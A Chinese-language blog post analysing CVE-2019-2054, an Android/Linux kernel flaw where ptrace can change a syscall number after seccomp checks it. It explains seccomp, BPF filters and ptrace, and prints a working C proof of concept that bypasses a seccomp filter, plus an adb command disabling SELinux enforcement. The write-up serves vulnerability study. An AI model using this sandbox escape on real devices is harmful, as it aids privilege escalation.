<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no"><meta name="author" content="Let_go"><meta name="renderer" content="webkit"><meta name="copyright" content="Let_go"><meta name="keywords" content="Let_go"><meta name="description" content="null"><meta name="Cache-Control" content="no-cache"><meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"><title>CVE-2019-2054 · Mr.Chen's Blog</title><link rel="stylesheet" href="/css/style.css?v=2018.7.9"><link rel="stylesheet" href="/css/animation.css?v=2018.7.9"><link rel="icon" href="/img/assets/favicon.ico"><link rel="stylesheet" href="https://cdn.bootcss.com/font-awesome/4.7.0/css/font-awesome.min.css?version=1.5.6"><!-- scripts--><script>(function( w ){
  "use strict";
  // rel=preload support test
  if( !w.loadCSS ){
    w.loadCSS = function(){};
  }
  // define on the loadCSS obj
  var rp = loadCSS.relpreload = {};
  // rel=preload feature support test
  // runs once and returns a function for compat purposes
  rp.support = (function(){
    var ret;
    try {
      ret = w.document.createElement( "link" ).relList.supports( "preload" );
    } catch (e) {
      ret = false;
    }
    return function(){
      return ret;
    };
  })();

  // if preload isn't supported, get an asynchronous load by using a non-matching media attribute
  // then change that media back to its intended value on load
  rp.bindMediaToggle = function( link ){
    // remember existing media attr for ultimate state, or default to 'all'
    var finalMedia = link.media || "all";

    function enableStylesheet(){
      link.media = finalMedia;
    }

    // bind load handlers to enable media
    if( link.addEventListener ){
      link.addEventListener( "load", enableStylesheet );
    } else if( link.attachEvent ){
      link.attachEvent( "onload", enableStylesheet );
    }

    // Set rel and non-applicable media type to start an async request
    // note: timeout allows this to happen async to let rendering continue in IE
    setTimeout(function(){
      link.rel = "stylesheet";
      link.media = "only x";
    });
    // also enable media after 3 seconds,
    // which will catch very old browsers (android 2.x, old firefox) that don't support onload on link
    setTimeout( enableStylesheet, 3000 );
  };

  // loop through link elements in DOM
  rp.poly = function(){
    // double check this to prevent external calls from running
    if( rp.support() ){
      return;
    }
    var links = w.document.getElementsByTagName( "link" );
    for( var i = 0; i < links.length; i++ ){
      var link = links[ i ];
      // qualify links to those with rel=preload and as=style attrs
      if( link.rel === "preload" && link.getAttribute( "as" ) === "style" && !link.getAttribute( "data-loadcss" ) ){
        // prevent rerunning on link
        link.setAttribute( "data-loadcss", true );
        // bind listeners to toggle media back
        rp.bindMediaToggle( link );
      }
    }
  };

  // if unsupported, run the polyfill
  if( !rp.support() ){
    // run once at least
    rp.poly();

    // rerun poly on an interval until onload
    var run = w.setInterval( rp.poly, 500 );
    if( w.addEventListener ){
      w.addEventListener( "load", function(){
        rp.poly();
        w.clearInterval( run );
      } );
    } else if( w.attachEvent ){
      w.attachEvent( "onload", function(){
        rp.poly();
        w.clearInterval( run );
      } );
    }
  }


  // commonjs
  if( typeof exports !== "undefined" ){
    exports.loadCSS = loadCSS;
  }
  else {
    w.loadCSS = loadCSS;
  }
}( typeof global !== "undefined" ? global : this ) );</script><script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js" defer></script><script src="/js/main.js?v=2018.7.9" defer></script><!-- fancybox--><link rel="preload" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'"><script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.js" defer></script><!-- busuanzi--><script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script></head><body><section class="profile-close" id="cxo-profile"><div class="profile-avatar"><i class="fa fa-caret-left"></i><img src="/img/assets/avatar.jpg"></div><!--.profile-saying
  i.fa.fa-comment
  .saying--><div class="cxo-profile-inner"><div class="profile-name">Let_go</div><div class="profile-signature">人生如棋,我愿为卒。行动虽慢,可谁曾见我后退一步。</div><div class="read-progress"></div></div></section><header id="cxo-intro" style="height: 70vh;background-image: url(/img/intro/index-bg.png);"><nav id="cxo-intro-nav"><section><div class="intro-nav-title"><a href="/">Mr.Chen's Blog</a></div><div class="intro-nav-label-box"><a href="/">Home</a><a href="/about">About</a><a href="/archives">Archives</a><a href="/tags">Tags</a></div><i class="fa fa-bars intro-nav-menu"><div class="intro-nav-drop"><a href="/">Home</a><a href="/about">About</a><a href="/archives">Archives</a><a href="/tags">Tags</a></div></i><div class="clear"></div></section></nav><h1 class="post-title">CVE-2019-2054</h1><div class="post-intros"><div class="post-intro-meta"><span class="post-intro-time"><i class="post-intro-calendar fa fa-calendar"></i><span>2019/04/10</span></span><span class="busuanzi-pv" id="busuanzi_container_page_pv"><i class="post-intro-calendar fa fa-user-o"></i><span id="busuanzi_value_page_pv"></span></span><span class="post-intro-tags"><a class="intro-tag fa fa-tag" href="javascript:void(0)" date-tags="Android_Kernel"> Android_Kernel</a></span></div></div></header><article class="cxo-up" id="cxo-content-outer"><section id="cxo-content-inner"><article class="article-entry" id="post"><h1 id="CVE-2019-2054"><a href="#CVE-2019-2054" class="headerlink" title="CVE-2019-2054"></a>CVE-2019-2054</h1><hr>
<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><h3 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h3><ul>
<li>实验环境：pixel2(内核版本4.4，安全补丁2019-04-05)</li>
<li>漏洞类型：TOCTOU(timer-of-check-time-of-use)</li>
<li>漏洞描述：在内核版本4.8之前，因为ptrace可以修改子进程进行系统调用时的syscall的调用号，而seccomp对系统调用的检查位于ptrace修改代码之前，这就可以通过ptrace来绕过seccomp对一些系统调用的检查，这可以配合一些漏洞进行提权操作。</li>
<li>调用链：syscall_trace_enter-&gt;secure_computing-&gt;__secure_computing-&gt;seccomp_phase1</li>
</ul>
<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><h3 id="漏洞原理-1"><a href="#漏洞原理-1" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p>这里简单记录下最近看的一个漏洞(CVE-2019-2054)，漏洞发生在版本小于4.8的内核中的一个TOCTOU(timer-of-check-time-of-use)漏洞，被ptrace之后的进程可以绕过seccomp对系统调用的检查(当seccomp把安全系统调用检查之后被ptrace把这个系统调用替换为被过滤的调用，这使得seccomp前面的检查就没有意义了)。所以这些旧版本的内核中开启seccomp的进程就不应该具有使用ptrace的能力。避免恶意进程使用ptrace对seccomp过滤进行逃逸。<br>在android系统中zygote程序将seccomp沙箱应用在system_server和所有的app进程中，并且这个seccomp沙箱允许使用ptrace函数这刚好满足这个漏洞所需的要求。</p>
<h3 id="漏洞造成的影响"><a href="#漏洞造成的影响" class="headerlink" title="漏洞造成的影响"></a>漏洞造成的影响</h3><p>通过这个漏洞可以实现对seccomp沙箱的绕过，从而调用一些系统限制我们调用的系统调用。增加了攻击面，结合别的漏洞可用做权限提升。</p>
<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><h3 id="seccomp机制"><a href="#seccomp机制" class="headerlink" title="seccomp机制"></a>seccomp机制</h3><p>既然该漏洞功能是绕过seccomp沙箱那么我们首先来看下什么是seccomp沙箱<br>seccomp是secure computing的缩写，是linux kernel从2.6.23版本中引入的一种简洁的sandboxing机制。由于linux中大量的系统调用直接暴露给用户程序。但并不是所有系统调用都会用到，所以一些不安全的代码滥用系统调用会对系统造成安全威胁。seccomp机制能使进程进入一种”安全”运行模式。<br>首先如果我们要使用该机制，需要在内核编译时开启以下几个选项，这样在启动后的系统中就能使用seccomp机制了。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">CONFIG_SECCOMP=y</div><div class="line">CONFIG_HAVE_ARCH_SECCOMP_FILTER=y</div><div class="line">CONFIG_SECCOMP_FILTER=y</div></pre></td></tr></table></figure></p>
<p>seccomp总共分为3种模式分别用0,1,2表示：</p>
<ul>
<li>0.尚未启动seccomp</li>
<li>1.启动seccomp沙箱”STRICT”模式</li>
<li>2.启动seccomp沙箱”FILTER”模式</li>
</ul>
<p>查看当前进程所使用的seccomp模式有2种方法。<br>1.通过<code>/proc/&lt;pid&gt;/status</code>文件中的Seccomp字段来确定当前进程属于哪种模式。<br>2.通过prctl函数使用PR_GET_SECCOMP选项获取，返回值则是。<br>再来看看”STRICT”与”FILTER”两种模式有什么不同。<br>首先是”STRICT”模式，该模式下只能调用4种系统调用即read,write,exit,sigreturn，如果调用其他不允许的系统调用则进程会收到SIGKILL信号而被终止运行。<br>用户程序中开启”STRICT”模式的方法：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="number">1.</span>prctl(PR_SET_SECCOMP,SECCOMP_MODE_STRICT);</div><div class="line"><span class="number">2.</span>seccomp(SECCOMP_SET_MODE_STRICT,<span class="number">0</span>,<span class="literal">NULL</span>);</div></pre></td></tr></table></figure></p>
<p>可以看到STRICT模式把权限设置还是比较死的，只能使用4个默认的系统调用，灵活性不够啊。那么有什么方法可以使我们自己设置过滤的系统调用吗？当然可以那就是”FILTER”模式，该模式我们可以自己编写过滤策略，相对于前面的模式来说”FILTER”模式就灵活多了。但也有一个限制那就是开启该模式需要具备CAP_SYS_ADMIN属性或当前进程设置了no_new_privs选项，可通过<code>prctl(PR_SET_NO_NEW_PRIVS, 1, 0, 0, 0);</code>来开启no_new_privs选项。如果不具备前面两个条件的任意一个那么使用SECCOMP_SET_MODE_FILTER选项时函数就会返回错误。这样设定的原因主要为了避免无特权的进程新增恶意bpf策略，no_new_privs选项主要是用于规避execve启动的程序权限大于父进程权限而造成一些列安全问题<br>开启”FILTER”模式的方法和前面的差不多只需要换下参数：(注意上面提到的该模式的前提条件)<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="number">1.</span>prctl(PR_SET_SECCOMP,SECCOMP_SET_MODE_FILTER,args);</div><div class="line"><span class="number">2.</span>seccomp(SECCOMP_SET_MODE_FILTER,<span class="number">0</span>,args);</div></pre></td></tr></table></figure></p>
<p>最后的args参数指向一个sock_fprog结构体，而sock_fprog结构体的filter成员指向的就是我们的bpf过滤代码。具体的结构体如下：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line"><span class="comment">/*设置SECCOMP_SET_MODE_FILTER模式时传入的args参数*/</span></div><div class="line"><span class="keyword">struct</span> sock_fprog &#123;	            <span class="comment">/* Required for SO_ATTACH_FILTER. */</span></div><div class="line">	<span class="keyword">unsigned</span> <span class="keyword">short</span>		len;	<span class="comment">/* Number of filter blocks */</span></div><div class="line">	<span class="keyword">struct</span> sock_filter __user *filter;</div><div class="line">&#125;;</div><div class="line"></div><div class="line"><span class="comment">/*用来创建bpf指令，系统调用时内核会用到*/</span></div><div class="line"><span class="keyword">struct</span> sock_filter &#123;	<span class="comment">/* Filter block */</span></div><div class="line">	__u16	code;       <span class="comment">/* Actual filter code */</span></div><div class="line">	__u8	jt;	        <span class="comment">/* Jump true */</span></div><div class="line">	__u8	jf;	        <span class="comment">/* Jump false */</span></div><div class="line">	__u32	k;          <span class="comment">/* Generic multiuse field */</span></div><div class="line">&#125;;</div><div class="line"></div><div class="line"><span class="comment">/*该结构体用来存放系统调用信息*/</span></div><div class="line"><span class="keyword">struct</span> seccomp_data &#123;</div><div class="line">	<span class="keyword">int</span>   nr;                   <span class="comment">/* System call number */</span></div><div class="line">	__u32 arch;                 <span class="comment">/* AUDIT_ARCH_* value(see &lt;linux/audit.h&gt;) */</span></div><div class="line">	__u64 instruction_pointer;  <span class="comment">/* CPU instruction pointer */</span></div><div class="line">	__u64 args[<span class="number">6</span>];              <span class="comment">/* Up to 6 system call arguments */</span></div><div class="line">&#125;;</div></pre></td></tr></table></figure></p>
<p>当触发一个过滤检查时(也就是调用限制系统调用时)，seccomp过滤器函数会根据过滤代码返回一个由两部分组成的32位值。前16-bit为SECCOMP_RET_ACTION,后16-bit为SECCOMP_RET_DATA。<br>SECCOMP_RET_ACTION定义了以下几种行为：<br>SECCOMP_RET_KILL – 不执行system call，立即中止process (SIGSYS)。<br>SECCOMP_RET_TRAP – 不执行system call，进程发出(SIGSYS)system call, 并system。 call相关信息存放到siginfo_t<br>SECCOMP_RET_ERRNO – 不执行system call，SECCOMP_RET_DATA返回errno。<br>SECCOMP_RET_TRACE – 启动ptrace base的tracer(如gdb), 让tracer可以接手处理。若没有tracer则返回-ENOSYS<br>SECCOMP_RET_ALLOW – system call正常运行<br>如果同时符合多个条件，则SECCOMP_RET_ACTION只会返回优先级较高的值。</p>
<p>SECCOMP_RET_DATA则表示我们的返回值。</p>
<h4 id="使用seccomp沙箱"><a href="#使用seccomp沙箱" class="headerlink" title="使用seccomp沙箱"></a>使用seccomp沙箱</h4><p>列出一个linux中使用该模式的例子：<a href="https://elixir.bootlin.com/linux/latest/source/samples/seccomp/dropper.c" target="_blank" rel="external">https://elixir.bootlin.com/linux/latest/source/samples/seccomp/dropper.c</a></p>
<h4 id="关闭seccomp沙箱"><a href="#关闭seccomp沙箱" class="headerlink" title="关闭seccomp沙箱"></a>关闭seccomp沙箱</h4><p>通过<code>adb shell setenforce 0 &amp;&amp; adb stop &amp;&amp; adb start</code>指令可关闭对zygote进程的seccomp的安装，因为无法从正在运行的进程中移除seccomp策略，所以需要重启shell以使该选项生效。</p>
<h4 id="seccomp检测工具"><a href="#seccomp检测工具" class="headerlink" title="seccomp检测工具"></a>seccomp检测工具</h4><p>AOSP项目中<code>/cts/tests/tests/security/jni/android_security_cts_SeccompTest.cpp</code>可用来检测当前设备阻止了哪些系统调用，原理就是不断试错。</p>
<h3 id="BPF策略"><a href="#BPF策略" class="headerlink" title="BPF策略"></a>BPF策略</h3><p>BPF（BSD Packet Filter）一种过滤机制，更多时候用来过滤Unix内核网络数据包，我们这里是seccomp用它来做系统调用的过滤操作，BPF采用一种叫过滤器伪机的方式(filter Pseudo-machine)对BPF过滤代码做解释执行，这种伪机器是一个轻量级，高效的状态机。BPF伪指令形式为”opcode jt jf k”也就是前面的sock_filter结构体，分别表示操作码，寻址方式，判断正确的跳转和失败的跳转，以及操作所使用的的通用数据域。|opcode|jt|jf|k|<br>下面是一组BPF代码，这段代码比较好理解，用来定义内核对系统调用nr的过滤，如果目标进程如果使用了nr系统调用，则会执行SECCOMP_RET_KILL选项也就是进程被直接杀掉，使用别的调用则会使用SECCOMP_RET_ALLOW选项直接放行。<br>涉及到的几个指令函数：<br>BPF_LD+BPF_W+BPF_ABS    A &lt;- P[k:4] /<em>将一个Word即4byte的值赋给寄存器(accumulator)</em>/<br>BPF_JMP+BPF_JEQ+BPF_K  pc += (A == k) ? jt : jf /<em>若A等于K则跳转jt行执行否则跳转jf行执行</em>/<br><a href="https://blog.csdn.net/u013837209/article/details/54926309" target="_blank" rel="external">更多指令含义</a><br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">struct</span> sock_filter filter[] = &#123;</div><div class="line">	BPF_STMT(BPF_LD+BPF_W+BPF_ABS,  <span class="comment">/*把获取seccomp_data结构体中arch变量的值并加载到寄存器中*/</span></div><div class="line">			 (offsetof(<span class="keyword">struct</span> seccomp_data, arch))),</div><div class="line">	BPF_JUMP(BPF_JMP+BPF_JEQ+BPF_K, arch, <span class="number">0</span>, <span class="number">3</span>),<span class="comment">/*判断获取的arch是否与我们过滤代码指定的arch一致,若一致继续判断,否则返回SECCOMP_RET_ALLOW*/</span></div><div class="line">	BPF_STMT(BPF_LD+BPF_W+BPF_ABS, <span class="comment">/*把获取seccomp_data结构体中nr变量的值并加载到寄存器中*/</span></div><div class="line">			 (offsetof(<span class="keyword">struct</span> seccomp_data, nr))),</div><div class="line">	BPF_JUMP(BPF_JMP+BPF_JEQ+BPF_K, nr, <span class="number">0</span>, <span class="number">1</span>),<span class="comment">/*判断获取的nr是否与我们过滤代码指定的nr一致,若一致则返回错误SECCOMP_RET_KILL,不一致则返回SECCOMP_RET_ALLOW*/</span></div><div class="line">	BPF_STMT(BPF_RET+BPF_K,</div><div class="line">			 SECCOMP_RET_KILL|(error &amp; SECCOMP_RET_DATA)),</div><div class="line">	BPF_STMT(BPF_RET+BPF_K, SECCOMP_RET_ALLOW),</div><div class="line">&#125;;</div></pre></td></tr></table></figure></p>
<p>学过汇编的朋友第一眼是不是感觉和汇编代码很相似，反正我感觉都差不多。</p>
<h3 id="ptrace使用"><a href="#ptrace使用" class="headerlink" title="ptrace使用"></a>ptrace使用</h3><p>ptrace想必大家都有所了解这里就不多介绍了，主要记录下用到的选项：<br>PTRACE_SETREGSET：用来修改tracee的寄存器，这里指定为NT_ARM_SYSTEM_CALL就可以把子进程的系统调用给改掉了，需要改的值放在iov结构体中。<br>ptrace(PTRACE_SETREGSET, child, NT_ARM_SYSTEM_CALL, &amp;iov)；</p>
<h3 id="利用代码"><a href="#利用代码" class="headerlink" title="利用代码"></a>利用代码</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/audit.h&gt;</span></span></div><div class="line">.....</div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/wait.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdbool.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">do_exp</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</div><div class="line">	<span class="keyword">int</span> status,sysnumber;</div><div class="line">	<span class="keyword">struct</span> iovec iov = &#123;.iov_base = &amp;sysnumber, .iov_len = <span class="keyword">sizeof</span>(sysnumber)&#125;;</div><div class="line">	<span class="keyword">pid_t</span> child = fork();</div><div class="line">	<span class="keyword">if</span> (child == <span class="number">-1</span>) err(<span class="number">1</span>, <span class="string">"fork"</span>);</div><div class="line">	<span class="keyword">if</span> (child == <span class="number">0</span>) &#123;</div><div class="line">		<span class="built_in">printf</span>(<span class="string">"[+] [Child] pid:%d\n"</span>,getpid());</div><div class="line">		<span class="comment">//syscall(__NR_swapon, 0, 0);</span></div><div class="line">		<span class="keyword">pid_t</span> my_pid = getpid();</div><div class="line">		<span class="keyword">while</span> (<span class="number">1</span>) &#123;</div><div class="line">			errno = <span class="number">0</span>;</div><div class="line">			<span class="keyword">int</span> res = syscall(__NR_gettid, <span class="number">0</span>, <span class="number">0</span>);												<span class="comment">/*不断执行syscall*/</span></div><div class="line">			<span class="keyword">if</span> (res != my_pid) &#123;</div><div class="line">				<span class="comment">//syscall(__NR_swapon, 0, 0);</span></div><div class="line">				<span class="built_in">printf</span>(<span class="string">"[Child] error -&gt; %d (%s)\n"</span>, res, strerror(errno));</div><div class="line">				<span class="comment">/*把错误值返回给父进程,正常返回表示绕过了沙箱,不然应该会被系统kill则表示没绕过沙箱*/</span></div><div class="line">				<span class="built_in">exit</span>(res);																	</div><div class="line">			&#125;</div><div class="line">		&#125;</div><div class="line">	&#125;</div><div class="line">	sleep(<span class="number">1</span>);</div><div class="line">	<span class="keyword">if</span> (ptrace(PTRACE_ATTACH, child, <span class="literal">NULL</span>, <span class="literal">NULL</span>)) err(<span class="number">1</span>, <span class="string">"ptrace attach"</span>);						<span class="comment">/*附加到进程*/</span></div><div class="line">	<span class="keyword">if</span> (waitpid(child, &amp;status, <span class="number">0</span>) != child) err(<span class="number">1</span>, <span class="string">"wait for child"</span>);</div><div class="line">	<span class="keyword">if</span> (ptrace(PTRACE_SYSCALL, child, <span class="literal">NULL</span>, <span class="literal">NULL</span>)) err(<span class="number">1</span>, <span class="string">"ptrace syscall entry"</span>);</div><div class="line">	<span class="keyword">if</span> (waitpid(child, &amp;status, <span class="number">0</span>) != child) err(<span class="number">1</span>, <span class="string">"wait for child"</span>);</div><div class="line">	<span class="keyword">if</span> (ptrace(PTRACE_GETREGSET, child, NT_ARM_SYSTEM_CALL, &amp;iov)) err(<span class="number">1</span>, <span class="string">"ptrace getregs"</span>);	<span class="comment">/*在子进程syscall的时候停止,获取系统调用号到iov中 (NT_ARM_SYSTEM_CALL   ARM system call number)*/</span></div><div class="line">	<span class="built_in">printf</span>(<span class="string">"seeing syscall %d\n"</span>, sysnumber);</div><div class="line">	<span class="keyword">if</span> (sysnumber != __NR_gettid) errx(<span class="number">1</span>, <span class="string">"not gettid"</span>);										<span class="comment">/*判断获取到的系统调用号是否为getpid*/</span></div><div class="line">	sysnumber = __NR_swapon;																	<span class="comment">/*修改系统调用号*/</span></div><div class="line">	<span class="keyword">if</span> (ptrace(PTRACE_SETREGSET, child, NT_ARM_SYSTEM_CALL, &amp;iov)) err(<span class="number">1</span>, <span class="string">"ptrace setregs"</span>);	<span class="comment">/*在子进程syscall的时候停止,通过iov修改 syscall的系统调用号*/</span></div><div class="line">	<span class="keyword">if</span> (ptrace(PTRACE_DETACH, child, <span class="literal">NULL</span>, <span class="literal">NULL</span>)) err(<span class="number">1</span>, <span class="string">"ptrace syscall"</span>);						<span class="comment">/*分离*/</span></div><div class="line">	</div><div class="line">	<span class="keyword">pid_t</span> pid;</div><div class="line">	<span class="keyword">bool</span> isvul=<span class="literal">false</span>;</div><div class="line">    pid = wait(&amp;status);</div><div class="line">    <span class="comment">//printf("child process has exited,pid=%d status=%d\n", pid,status);</span></div><div class="line">    <span class="keyword">if</span> ( WIFEXITED(status) )&#123;																	<span class="comment">/*通过判断子进程是否正常返回区分是否绕过了seccomp沙箱*/</span></div><div class="line">		<span class="built_in">printf</span>(<span class="string">"child exited with code:%d\n"</span>, WEXITSTATUS(status));</div><div class="line">		isvul = <span class="literal">true</span>;</div><div class="line">	&#125;<span class="keyword">else</span>&#123;</div><div class="line">		isvul = <span class="literal">false</span>;</div><div class="line">		<span class="built_in">printf</span>(<span class="string">"child process exit abnormally\n"</span>);</div><div class="line">	&#125;</div><div class="line"></div><div class="line">	<span class="comment">//kill(child, SIGCONT);</span></div><div class="line">	<span class="comment">//sleep(5);</span></div><div class="line">	<span class="comment">//kill(child, SIGKILL);</span></div><div class="line">	<span class="keyword">return</span> isvul;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">install_filter</span><span class="params">(<span class="keyword">int</span> nr, <span class="keyword">int</span> arch, <span class="keyword">int</span> error)</span></span>&#123;</div><div class="line">	<span class="keyword">struct</span> sock_filter filter[] = &#123;</div><div class="line">		BPF_STMT(BPF_LD+BPF_W+BPF_ABS,</div><div class="line">			 (offsetof(<span class="keyword">struct</span> seccomp_data, arch))),</div><div class="line">		BPF_JUMP(BPF_JMP+BPF_JEQ+BPF_K, arch, <span class="number">0</span>, <span class="number">3</span>),</div><div class="line">		BPF_STMT(BPF_LD+BPF_W+BPF_ABS,</div><div class="line">			 (offsetof(<span class="keyword">struct</span> seccomp_data, nr))),</div><div class="line">		BPF_JUMP(BPF_JMP+BPF_JEQ+BPF_K, nr, <span class="number">0</span>, <span class="number">1</span>),</div><div class="line">		BPF_STMT(BPF_RET+BPF_K,</div><div class="line">			 SECCOMP_RET_KILL|(error &amp; SECCOMP_RET_DATA)),</div><div class="line">		<span class="comment">//BPF_STMT(BPF_RET+BPF_K,SECCOMP_RET_KILL),</span></div><div class="line">		BPF_STMT(BPF_RET+BPF_K, SECCOMP_RET_ALLOW),</div><div class="line">	&#125;;</div><div class="line">	</div><div class="line">	<span class="keyword">struct</span> sock_fprog prog = &#123;</div><div class="line">		.len = (<span class="keyword">unsigned</span> <span class="keyword">short</span>)(<span class="keyword">sizeof</span>(filter)/<span class="keyword">sizeof</span>(filter[<span class="number">0</span>])),</div><div class="line">		.filter = filter,</div><div class="line">	&#125;;</div><div class="line">	</div><div class="line">	<span class="keyword">if</span> (prctl(PR_SET_NO_NEW_PRIVS, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>)) &#123;</div><div class="line">		perror(<span class="string">"prctl(NO_NEW_PRIVS)"</span>);</div><div class="line">		<span class="keyword">return</span> <span class="number">1</span>;</div><div class="line">	&#125;</div><div class="line">	</div><div class="line">	<span class="keyword">if</span> (prctl(PR_SET_SECCOMP, <span class="number">2</span>, &amp;prog)) &#123;</div><div class="line">		perror(<span class="string">"prctl(PR_SET_SECCOMP)"</span>);</div><div class="line">		<span class="keyword">return</span> <span class="number">1</span>;</div><div class="line">	&#125;</div><div class="line">	<span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span></span>&#123;</div><div class="line">	<span class="built_in">printf</span>(<span class="string">"[+] __NR_swapon:%d pid:%d\n"</span>,__NR_swapon,getpid());</div><div class="line">	<span class="keyword">if</span> (install_filter(__NR_swapon, AUDIT_ARCH_AARCH64,SECCOMP_RET_KILL)) <span class="comment">/*对__NR_swapon系统调用设置过滤*/</span></div><div class="line">		<span class="keyword">return</span> <span class="number">1</span>;</div><div class="line">	<span class="keyword">if</span>(do_exp())&#123;</div><div class="line">		<span class="built_in">printf</span>(<span class="string">" Vulnerability \n"</span>);</div><div class="line">	&#125;<span class="keyword">else</span>&#123;</div><div class="line">		<span class="built_in">printf</span>(<span class="string">" No Vulnerability \n"</span>);</div><div class="line">	&#125;</div><div class="line">	<span class="comment">//syscall(__NR_swapon, 0, 0);</span></div><div class="line">	<span class="comment">//printf("Failed to swapon\n");</span></div><div class="line">	<span class="keyword">return</span> <span class="number">1</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>感觉这段时间尽看些逻辑漏洞，逻辑漏洞利用起来不用过各种保护机制真是好，而且还特稳定，不像内存破坏漏洞还需要绕过各种保护机制才能提权成功，而某些逻辑漏洞直接就能提权。<br>唉，早点休息早点休息，狗命要紧。</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">https:<span class="comment">//bugs.chromium.org/p/project-zero/issues/detail?id=1718&amp;can=1&amp;q=jannh&amp;sort=-reported&amp;colspec=ID%20Status%20Restrict%20Reported%20Vendor%20Product%20Finder%20Summary</span></div><div class="line">https:<span class="comment">//szlin.me/2017/08/23/kernel_seccomp/</span></div><div class="line">http:<span class="comment">//www.tin.org/bin/man.cgi?section=2&amp;topic=ptrace</span></div><div class="line">http:<span class="comment">//wiki.mozilla.org/Security/Sandbox/Seccomp</span></div><div class="line">http:<span class="comment">//www.selinuxplus.com/?p=363</span></div></pre></td></tr></table></figure>
